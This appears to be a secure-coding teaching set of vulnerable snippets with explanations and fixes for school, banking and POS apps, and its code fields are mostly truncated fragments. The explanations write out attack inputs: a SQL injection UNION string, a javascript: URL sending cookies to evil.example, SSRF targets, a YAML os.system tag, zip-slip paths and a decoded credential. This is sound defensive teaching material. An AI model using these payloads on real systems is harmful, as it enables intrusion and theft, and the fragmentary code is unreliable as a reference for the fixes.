snippets.title: Nightly carry-over report
snippets.context: A results portal job runs every night and emails each head of department (HOD) the students who failed a course. HODs can rename their department on a settings page, and that update uses a parameterised query.
code: // Nightly job: email each head of department their carry-over list.
const { rows: depts } = await db.query('SELECT id, name, hod_email FROM departments');
snippets.explanation: This is second order SQL injection. The department name went into the database safely, so it feels trusted when it comes back out, but the job pastes it into SQL. An HOD who renames their department to  x' UNION SELECT username, password_hash FROM staff --  gets every staff password hash emailed to them that night, sent by the job itself with its database privileges. Data from your own database is still user input if a user wrote it.

fix.summary: Bind every value as a parameter, including values you read from your own tables. Here, filter by the department ID instead of the name.
code: // Nightly job: email each head of department their carry-over list.
const { rows: depts } = await db.query('SELECT id, name, hod_email FROM departments');

snippets.title: Lecturer profile page
snippets.context: Students open a lecturer's profile on the school portal to read their bio and visit their website. Lecturers edit their own profile.
code: $stmt = $pdo->prepare('SELECT title, full_name, bio, website FROM lecturers WHERE id = ?');
snippets.explanation: Every value is escaped, so no tag can be injected. But escaping protects the HTML, not what a URL means. A website saved as  javascript:fetch('https://evil.example/?c='+document.cookie)  contains no < or quote to escape, and it runs on the portal's own origin the moment a student clicks the link. A compromised lecturer account becomes a way into every student account that visits the profile.

fix.summary: Allow only http and https URLs, both when the profile is saved and when the link is printed. Escaping is still needed on top of the scheme check.
code: $stmt = $pdo->prepare('SELECT title, full_name, bio, website FROM lecturers WHERE id = ?');

snippets.title: Account statement download
snippets.context: Customers of a digital bank download monthly statements. The URL names the account and the statement, for example /api/accounts/88/statements/1204.
code: from flask import Flask, g, abort, send_file
from auth import login_required  # sets g.user
from models import db, Account, Statement
snippets.explanation: The ownership check is real, but it checks the wrong object. It proves account 88 belongs to the caller, then loads statement 1204 by its ID alone. Keep your own account ID in the URL and count through statement IDs, and you download other customers' statements, with their balances, transfers and who they paid. When a URL names a parent and a child, the child has to be fetched through the parent.

fix.summary: Load the statement with both IDs, so it's only found when it belongs to the account the caller owns.
code: from flask import Flask, g, abort, send_file
from auth import login_required  # sets g.user
from models import db, Account, Statement

snippets.title: BVN lookup client
snippets.context: During account opening, a digital bank checks a customer's BVN through an identity verification partner. Each lookup is billed and returns personal data.
code: // BVN lookup during account opening, through our identity verification partner.
snippets.explanation: It doesn't look like a password, but a Basic auth header is just username:password in Base64, and Base64 is an encoding anyone can reverse with one command. This one decodes to th3bank-live:Kx9vLagos2026Bvn, the live login for the BVN partner. Anyone who can read the repo can run BVN lookups on your account, which costs you money and exposes customers' names, birth dates and phone numbers.

fix.summary: Load the partner credentials from the environment or a secrets manager, build the header at runtime, fail fast if they're missing, and rotate the credential that was committed.
code: // BVN lookup during account opening, through our identity verification partner.
throw new RuntimeException('KYC credentials are not configured');

snippets.title: Staff password hashing
snippets.context: The password module for staff accounts on a POS agent network's back office. It uses PBKDF2 with a random salt and stores the settings alongside each hash.
code: def verify_password(password: str, stored: str) -> bool:
snippets.explanation: The right algorithm with the wrong setting. PBKDF2 is only slow because it repeats the hash many times, and 1,000 rounds is hundreds of times fewer than current guidance. OWASP recommends at least 600,000 for PBKDF2-HMAC-SHA256, so a leaked table can be cracked roughly 600 times faster than it should be. Salt, constant time comparison and the stored format are all fine.

fix.summary: Raise the iteration count to at least 600,000 (or move to Argon2id or scrypt). Because the count is stored with each hash, old hashes still verify; rehash them at the next successful login.

snippets.title: Passport photo zip import
snippets.context: Schools upload one zip of student passport photos for ID card printing. Each school's photos go into its own folder.
code: // Schools upload one zip of student passport photos for ID card printing.
snippets.explanation: This is "zip slip". Names inside a zip file are just text chosen by whoever built it, and they can contain ../. An entry called ../14/20-0045.jpg passes the extension check and path.join walks it out of this school's folder and into another school's, swapping the photo on someone else's ID card. Deeper ../ chains reach any folder the app can write to, such as a public web folder.

fix.summary: Resolve each entry's path and check it still sits inside the output folder, or keep only the base file name so the zip's folders are ignored.
code: // Schools upload one zip of student passport photos for ID card printing.
throw new Error(`Unsafe path in zip: ${entry.entryName}`);

snippets.title: Selfie check from the CDN
snippets.context: During account opening, the app uploads the customer's selfie to the bank's CDN, then sends the image URL to this endpoint for a face match against their BVN photo.
code: from flask import Flask, request, jsonify, g
from auth import login_required  # sets g.user
return jsonify(error="Upload the image to the CDN first"), 400
snippets.explanation: startswith compares text, not hosts. https://cdn.th3bank.example.ng.evil.example/x starts with the CDN string but is a domain the attacker owns, with a valid certificate. That server answers with a redirect, requests follows redirects by default, and the bank's server is now making requests to internal addresses such as http://169.254.169.254 or an admin API on 10.0.0.0/8. The attacker sees only the status, but status alone is enough to map and hit internal services.

fix.summary: Parse the URL and compare the exact scheme and hostname, reject user info and unexpected ports, and turn off redirects.
code: from flask import Flask, request, jsonify, g
from auth import login_required  # sets g.user
or parts.username or parts.password or parts.port not in (None, 443)):
return jsonify(error="Upload the image to the CDN first"), 400

snippets.title: Timetable import
snippets.context: School admins import the exam timetable from a YAML file. Departments often share these files in WhatsApp groups before the admin uploads one.
code: from flask import Flask, request, jsonify
if upload is None or not upload.filename.endswith((".yml", ".yaml")):
if not isinstance(data, dict) or "sessions" not in data:
return jsonify(error="Timetable must have a sessions list"), 422
snippets.explanation: Passing a Loader silences PyYAML's warning, so this looks deliberate and safe. But yaml.Loader is the full loader: it understands tags such as !!python/object/apply:os.system, which build Python objects and call functions while the file is being read. A timetable file passed around a department group with one extra line runs commands on the server the moment an admin imports it. The type check afterwards is too late.

fix.summary: Use yaml.safe_load, which only builds plain data: dicts, lists, strings, numbers, booleans and dates.
code: from flask import Flask, request, jsonify
if upload is None or not upload.filename.endswith((".yml", ".yaml")):
data = yaml.safe_load(upload.stream)  # plain data only, never objects
if not isinstance(data, dict) or "sessions" not in data:
return jsonify(error="Timetable must have a sessions list"), 422

snippets.title: POS partial refund
snippets.context: POS agents can refund part of a card payment, for example when a customer returns some of the goods. The refund goes back to the customer's card.
code: // POS agents can refund part of a card payment, e.g. when goods are returned.
'SELECT id, agent_id, amount_kobo, status FROM transactions WHERE ref = $1 FOR UPDATE',
await t.none('INSERT INTO refunds (transaction_id, amount_kobo) VALUES ($1, $2)',
snippets.explanation: Each refund is checked on its own: a whole number, above zero, no more than the payment. Nothing checks what was already refunded. An agent working with a customer refunds a ₦10,000 payment ten times at ₦10,000 and ₦100,000 lands on the card. The row lock stops two refunds racing, but the rule it protects is incomplete. Validation has to cover the business rule, not just the shape of one number.

fix.summary: Inside the same locked transaction, add up the refunds already made and limit the new refund to what's left of the original payment.
code: // POS agents can refund part of a card payment, e.g. when goods are returned.
'SELECT id, agent_id, amount_kobo, status FROM transactions WHERE ref = $1 FOR UPDATE',
'SELECT COALESCE(SUM(amount_kobo), 0) AS done FROM refunds WHERE transaction_id = $1', [tx.id]);

snippets.title: Agent daily summary
snippets.context: The POS agent app shows a daily summary of transactions and commission. The mobile team added a header to help them debug failed requests.
code: // buildDailySummary validates the date and uses prepared statements
// Mobile team asked for this so they can debug from the app
echo json_encode(['error' => 'Could not load your summary', 'ref' => $ref]);
snippets.explanation: The body does everything right: a generic message and a reference ID, with the details logged on the server. The leak is in a response header, where most reviewers never look. Every failure now sends the exception class, the raw message (for a PDOException that includes SQL error text) and the server file path and line to anyone who triggers an error, in production and to every agent's phone.

fix.summary: Remove the header. Give the mobile team the reference ID instead and let them look it up in the server logs, or send detail only in a development build.
code: // buildDailySummary validates the date and uses prepared statements
header('X-Error-Ref: ' . $ref); // look this up in the server logs
echo json_encode(['error' => 'Could not load your summary', 'ref' => $ref]);
